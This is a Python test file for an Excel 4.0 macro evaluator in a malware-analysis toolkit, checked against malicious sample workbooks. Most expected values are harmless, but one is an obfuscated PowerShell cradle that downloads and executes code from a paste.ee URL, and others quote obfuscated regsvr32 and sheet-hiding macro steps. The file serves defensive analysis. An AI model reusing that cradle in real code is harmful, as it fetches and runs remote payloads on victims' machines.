from __future__ import annotations

from refinery.lib.excel import parse_formula
from refinery.lib.excel.formula.model import XlDefinedName, XlFunctionCall, XlUnparsedFormula
from refinery.lib.scripts.xlm import (
    XlmCursor,
    XlmEngine,
    XlmReference,
    XlmView,
    evaluate_expression,
)
from test import TestBase
from test.lib.excel.samples import (
    DATES_XLSB,
    XLM_MACRO_FORMULA_XLSM,
    XLM_MACRO_NAMES_BIFF8,
    XLM_MACRO_RPN_BIFF8,
    XLM_MACRO_TEXT_XLSM,
)
from test.lib.scripts.xlm.test_view import _with_part_replacement

_MALDOC = 'dc44bbfc845fc078cf38b9a3543a32ae1742be8c6320b81cf6cd5a8cee3c696a'


class TestEvaluateExpression(TestBase):

    def test_the_string_literal_of_the_maldoc_dat_cell(self):
        view = XlmView(self.download_sample(_MALDOC))
        cell = view.cell('Sheet2', 12, 11)
        assert cell is not None and cell.formula is not None
        value = evaluate_expression(
            XlmEngine(view), cell.formula, XlmCursor('Sheet2', 12, 11),
        )
        self.assertEqual(value.value, '.dat')
        self.assertEqual(value.text, '".dat"')

    def test_the_argument_of_the_char_call_computes(self):
        view = XlmView(XLM_MACRO_FORMULA_XLSM)
        cell = view.cell('Cdfea', 2, 5)
        assert cell is not None and isinstance(cell.formula, XlFunctionCall)
        value = evaluate_expression(
            XlmEngine(view), cell.formula.arguments[0], XlmCursor('Cdfea', 2, 5),
        )
        self.assertEqual(value.value, 111)
        self.assertEqual(value.text, '111')

    def test_a_command_without_a_handler_spells_its_call_unevaluated(self):
        view = XlmView(XLM_MACRO_RPN_BIFF8)
        cell = view.cell('mP9mScF1m5', 50, 19)
        assert cell is not None and isinstance(cell.formula, XlFunctionCall)
        outcome = XlmEngine(view).call(cell.formula, XlmCursor('mP9mScF1m5', 50, 19))
        self.assertEqual(outcome.value.text, '=WORKBOOK.HIDE("mP9mScF1m5",TRUE)')
        self.assertEqual(outcome.value.partial, True)

    def test_a_relative_reference_resolves_against_the_reading_cell(self):
        data = _with_part_replacement(
            XLM_MACRO_FORMULA_XLSM,
            'xl/worksheets/sheet2.xml',
            b'CHAR(113-2)',
            b'R[2]C[6]',
        )
        view = XlmView(data)
        cell = view.cell('Cdfea', 2, 5)
        assert cell is not None and cell.formula is not None
        value = evaluate_expression(
            XlmEngine(view), cell.formula, XlmCursor('Cdfea', 2, 5),
        )
        self.assertEqual(value.value, 1)
        self.assertEqual(value.reference, XlmReference('Cdfea', 4, 11))

    def test_a_name_entry_resolves_to_the_cell_it_names(self):
        view = XlmView(XLM_MACRO_FORMULA_XLSM)
        value = XlmEngine(view).resolve_name(
            XlDefinedName(name='NEVR3'), XlmCursor('PCWV', 1, 7),
        )
        self.assertEqual(value.value, '')
        self.assertEqual(value.text, '')
        self.assertEqual(value.reference, XlmReference('PCWV', 17, 7))

    def test_a_literal_cell_read_answers_its_stored_value(self):
        view = XlmView(XLM_MACRO_FORMULA_XLSM)
        value = XlmEngine(view).read_reference(
            XlmReference('Tgbfgs', 4, 9), XlmCursor('Cdfea', 2, 5),
        )
        self.assertEqual(value.value, 'r"&"eg"&"s"&"vr3"&"2.e"&"x"&"e')
        self.assertEqual(value.text, '"r""&""eg""&""s""&""vr3""&""2.e""&""x""&""e"')

    def test_a_date_cell_read_keeps_the_serial_and_sets_the_date_flag(self):
        view = XlmView(DATES_XLSB)
        value = XlmEngine(view).read_reference(
            XlmReference('Sheet1', 1, 1), XlmCursor('Sheet1', 1, 1),
        )
        self.assertEqual(value.value, 43893)
        self.assertEqual(value.date, True)

    def test_an_address_the_workbook_does_not_hold_is_empty(self):
        value = XlmEngine(XlmView(XLM_MACRO_FORMULA_XLSM)).read_reference(
            XlmReference(None, 9999, 1), XlmCursor('Cdfea', 2, 5),
        )
        self.assertEqual(value.text, '')
        self.assertEqual(value.partial, False)

    def test_the_node_kinds_the_corpus_carries_no_vector_for(self):
        """
        The array constant, the percent operator, the unary plus, the error literal, and the
        parenthesized operand have no vector in any sample; the text parser spells them.
        """
        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
        cursor = XlmCursor('Doc1', 109, 52)
        array = evaluate_expression(engine, parse_formula('{1,2;3,4}'), cursor)
        self.assertEqual([cell.value for cell in array.cells], [1, 2, 3, 4])
        for formula, expected in [
            ('50%', 0.5),
            ('+7', 7),
            ('(1+2)*3', 9),
        ]:
            with self.subTest(formula=formula):
                self.assertEqual(
                    evaluate_expression(engine, parse_formula(formula), cursor).value,
                    expected,
                )
        self.assertEqual(
            evaluate_expression(engine, parse_formula('#N/A'), cursor).text,
            '#N/A',
        )

    def test_a_scalar_operator_reads_a_single_cell_range_as_its_cell(self):
        """
        A range that names one cell twice is the smallest rectangle a range can be, and a scalar
        read of it takes the value of that cell; any wider range keeps the address it spells.
        """
        engine = XlmEngine(XlmView(XLM_MACRO_NAMES_BIFF8))
        cursor = XlmCursor('Acf444', 9591, 1)
        value = evaluate_expression(engine, parse_formula('"x"&A9590:A9590'), cursor)
        self.assertEqual(
            value.value,
            "xIEX (new`-OB`jeCT('Net.WebClient')).'DoWnloAdsTrInG'('ht'+'tp://paste.ee/r/pLpR9')",
        )
        self.assertEqual(value.partial, False)
        wider = evaluate_expression(engine, parse_formula('"x"&A9590:A9592'), cursor)
        self.assertEqual(wider.value, 'xAcf444!A9590:Acf444!A9592')

    def test_an_unparsed_formula_evaluates_to_its_partial_text(self):
        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
        value = evaluate_expression(
            engine, XlUnparsedFormula(text='garbage'), XlmCursor('Doc1', 109, 52),
        )
        self.assertEqual(value.value, 'garbage')
        self.assertEqual(value.partial, True)
